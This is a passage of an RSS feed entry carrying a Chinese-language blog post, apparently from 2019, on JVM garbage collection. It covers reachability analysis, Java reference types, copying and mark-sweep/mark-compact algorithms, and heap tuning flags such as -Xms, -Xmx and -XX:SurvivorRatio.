&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;2、可达性分析算法&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　使用一系列的GC Roots的对象（包括：虚拟机栈中引用的对象，方法区中类静态属性引用的对象，方法区中常量引用的对象，本地方法栈中JNI引用的对象）作为起点，从节点开始向下搜索，当没有被GCRoots链接到的对象就可以回收，如下图的对象4和5就判断为可回收对象。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1646058/201905/1646058-20190522111429032-319436978.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　在JDK1.2之后，Java对引用这个概念进行了扩充，也就是对象不仅仅只有引用和没有引用两个概念，而是扩展到了4个：&lt;/p&gt;
&lt;p&gt;　　强引用：类似于“Object obj=new Object（）”只要强引用在，垃圾收集器永远不会回收掉被引用的对象。&lt;/p&gt;
&lt;p&gt;　　软引用：是用来描述一些还有用但是并非必需的对象，对于软引用对象，在内存溢出异常之前，会把这些对象列进回收范围之中进行第二次回收。&lt;/p&gt;
&lt;p&gt;　　弱引用，比软引用更弱一点，被弱引用关联的对象只能生存到下一次垃圾收集发生之前。当垃圾收集发生时无论内存是否足够，&lt;strong&gt;都会只回收弱引用的对象。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　虚引用，最弱的引用关系，对象是否有虚引用对其生存时间是没有影响的。唯一目的就是能在这个对象被收集器回收时收到&lt;strong&gt;一个系统通知&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;　　对象要想真正宣告“死亡”需要至少两次的标记过程，当对象在可达性分析时候发现没有被GC Roots链到那么对象就会进行第一次标记并且进行第一次筛选，筛选的条件就是判断该对象有没有必要执行finalize()方法，需要执行的话就会把对象放入F-Queue的对列中去执行该对象中的finalize()方法。如果finalize()方法让对象重新被GC Roots链到那么对象就重新活下来，否则就会进行第二次标记，等待垃圾回收的到来&lt;/p&gt;

&lt;p&gt;　　目前来说Java堆中的对象是分为新生代和老年代，对于新生代中的对象采用的是复制算法清理&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;1、复制算法&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　它将可用内存空间划分为一块较大的Eden空间和两块较小的From Survivor（S0）和To Survivor（S1）空间。每次使用时只使用Eden和其中一块S区。比如这次使用的是S0区。回收时将Eden和S0区中的中还存活的对象一次性复制到S1中最后再清理Eden和S0中的对象，HotSpot虚拟机默认Eden:S0:S1之间大小比例是8:1:1，这是因为新生代中对象大多数甚至98%的都是“朝生夕死”。如果S区的大小不够那么就会依赖老年代的内存进行分配担保。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1646058/201905/1646058-20190522151541178-408970712.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;2、标记—清理与标记—整理算法&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　在老年代中因为对象存活率高，没有额外的空间对它进行分配担保，所以会采用标记—清理或标记—整理算法来进行回收对象&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;标记—清理算法&lt;/strong&gt;：首先标记出所有需要回收的对象，在标记完成之后统一回收所有标记的对象&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1646058/201905/1646058-20190522152046125-1934176031.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;标记—整理算法&lt;/strong&gt;：先标记所有可回收对象，让存活的对象向一端移动，然后直接清理掉端边界以外的内存&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1646058/201905/1646058-20190522152106849-298639200.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　上面的标记过程都是根据可达性分析算法中对象标记判定来实现的。&lt;/p&gt;

&lt;p&gt;　　上面介绍了这么多，那我们到底怎么操作里面的一些参数呢？&lt;/p&gt;
&lt;p&gt;　　-Xms:初始堆大小，JVM 启动的时候，给定堆空间大小。&lt;/p&gt;
&lt;p&gt;　　-Xmx:最大堆大小，JVM 运行过程中，如果初始堆空间不足的时候，最大可以扩展到多 少。&lt;/p&gt;
&lt;p&gt;　　-Xmn:设置年轻代大小。整个堆大小=年轻代大小+年老代大小+持久代大小。持久代一 般固定大小为 64m，所以增大年轻代后，将会减小年老代大小。&lt;strong&gt;此值对系统性能影响较大， Sun 官方推荐配置为整个堆的 3/8。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　-Xss:设置每个线程的 Java 栈大小。JDK5.0 以后每个线程 Java 栈大小为 1M，以前每 个线程堆栈大小为 256K。根据应用的线程所需内存大小进行调整。在相同物理内存下，减 小这个值能生成更多的线程。但是操作系统对一个进程内的线程数还是有限制的，不能无限生成。&lt;/p&gt;
&lt;p&gt;　　-XX:NewSize=n:设置年轻代大小&lt;/p&gt;
&lt;p&gt;　　-XX:NewRatio=n:设置年轻代和年老代的比值。如:为 3，表示年轻代与年老代比值为 1： 3，年轻代占整个年轻代+年老代和的 1/4&lt;/p&gt;
&lt;p&gt;　　-XX:SurvivorRatio=n:年轻代中 Eden 区与两个 Survivor 区的比值。注意 Survivor 区有两个。 如：3，表示 Eden：Survivor=3：2，一个 Survivor 区占整个年轻代的 1/5&lt;/p&gt;
&lt;p&gt;　　-XX:MaxPermSize=n:设置持久代大小 &lt;/p&gt;
&lt;p&gt;　　-XX:MaxTenuringThreshold:设置垃圾最大年龄。如果设置为 0 的话，则年轻代对象不经 过 Survivor 区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在 Survivor 区进行多次复制，这样可以增加对象再年轻代 的存活时间，增加在年轻代即被回收的概率。&lt;br/&gt;&lt;/p&gt;

</description>
<pubDate>Wed, 22 May 2019 11:16:00 +0000</pubDate>
<dc:creator>方块人</dc:creator>
<og:description>前言 程序计数器，虚拟机栈，本地方法3个区域随线程而生，随线程而灭，栈中的栈帧随着方法的进入和退出有条不紊地执行着出栈和入栈操作，每一个栈帧中分配多少内存，基本上是在类结构确定下来就已知。因此这几个区</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Cubemen/p/10905130.html</dc:identifier>
</item>
</channel>
</rss>